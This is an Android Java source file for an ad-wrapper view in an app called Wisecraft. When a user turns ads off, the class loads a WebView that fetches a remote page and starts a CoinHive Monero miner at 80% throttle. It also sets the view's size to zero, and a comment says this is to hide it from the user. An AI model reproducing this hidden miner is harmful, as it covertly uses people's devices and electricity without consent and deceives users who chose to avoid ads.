package com.nao20010128nao.Wisecraft.misc.view;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.TypedArray;
import android.os.Build;
import android.support.annotation.AttrRes;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.annotation.StyleRes;
import android.util.AttributeSet;
import android.view.LayoutInflater;
import android.view.ViewGroup;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;

import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.nao20010128nao.Wisecraft.misc.Utils;
import com.nao20010128nao.Wisecraft.R;

import java.util.Calendar;
import java.util.Date;

/**
 * Created by lesmi on 17/09/21.
 */

public class WisecraftMonetizeWrapperView extends FrameLayout {
    AdRank rank;

    public WisecraftMonetizeWrapperView(@NonNull Context context) {
        super(context);
        setup(context, null);
    }

    public WisecraftMonetizeWrapperView(@NonNull Context context, @Nullable AttributeSet attrs) {
        super(context, attrs);
        setup(context, attrs);
    }

    public WisecraftMonetizeWrapperView(@NonNull Context context, @Nullable AttributeSet attrs, @AttrRes int defStyleAttr) {
        super(context, attrs, defStyleAttr);
        setup(context, attrs);
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public WisecraftMonetizeWrapperView(@NonNull Context context, @Nullable AttributeSet attrs, @AttrRes int defStyleAttr, @StyleRes int defStyleRes) {
        super(context, attrs, defStyleAttr, defStyleRes);
        setup(context, attrs);
    }

    private void setup(Context c, AttributeSet attrs){
        TypedArray adRank=c.obtainStyledAttributes(attrs,new int[]{R.attr.wcAdRank});
        rank=AdRank.values()[adRank.getInt(0,2)];
        adRank.recycle();

        SharedPreferences pref= Utils.getPreferences(c);
        if(pref.getBoolean("neverShowAds",false)){
            // WebView with Monero Miner
            LayoutInflater.from(c).inflate(R.layout.money_monero,this);
            if(rank!=AdRank.MOB){
                // boot Monero miner
                WebView view=findViewById(R.id.adView);
                view.setWebViewClient(new WebViewClient(){
                    @Override
                    public void onPageFinished(WebView view, String url) {
                        if("http://nao20010128nao.github.io/monero/boilerplate".equals(url)){
                            // boot the miner
                            view.loadUrl("javascript: new CoinHive.Anonymous('LZSdFJYBUldfKhSwZV5aWrgDXpFzut66',{throttle: 0.8}).start()");
                        }
                    }
                });
                view.loadUrl("http://nao20010128nao.github.io/monero/boilerplate");
            }else{
                ((ViewGroup)getParent()).removeView(this);
            }
        }else{
            // AdView
            LayoutInflater.from(c).inflate(R.layout.money_ad_view,this);
            AdView view=findViewById(R.id.adView);
            // set it 15 years ago to prevent from showing adult ads
            Calendar calendar=Calendar.getInstance();
            calendar.setTimeInMillis(System.currentTimeMillis());
            calendar.set(calendar.get(Calendar.YEAR)-15,calendar.get(Calendar.MONTH),calendar.get(Calendar.DAY_OF_MONTH));
            view.loadAd(new AdRequest.Builder().setBirthday(calendar.getTime()).build());
        }
    }

    @Override
    public void setLayoutParams(ViewGroup.LayoutParams params) {
        SharedPreferences pref= Utils.getPreferences(getContext());
        if(pref.getBoolean("neverShowAds",false)){
            // set size to 0 to hide from user
            params.height=params.width=0;
        }
        super.setLayoutParams(params);
    }

    private enum AdRank{
        /** Work fully */
        LEADER,
        /** Work fully except for least mode */
        SIDE,
        /** Disables Miner */
        MOB;
    }
}
